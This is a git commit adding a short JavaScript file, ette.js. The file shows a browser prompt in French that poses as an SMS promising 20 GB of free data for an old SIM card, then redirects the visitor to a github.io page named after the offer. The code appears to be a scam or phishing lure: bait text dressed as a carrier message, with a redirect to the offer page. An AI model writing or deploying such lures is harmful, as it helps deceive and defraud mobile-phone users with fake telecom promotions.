3190ac9427f36c5ab2dd9439c7f42698a26f193d
offernoww <josiahnyeti16@gmail.com>
2025-02-15 12:29:53 +0100

    Create ette.js

---
+++ ette.js
@@ -0,0 +1,6 @@
+
+var password = 'Offre OldSim 20 Go'
+password=prompt('SMS :Obtenez 20 Go gratuits avec votre ancienne carte SIM maintenant, cliquez sur OK pour obtenir le vôtre  ','Offre OldSim 20 Go');
+if (password != 'Offre OldSim 20 Go') {
+location.href='https://offernoww.github.io/Offre-OldSim-20-Go';
+}
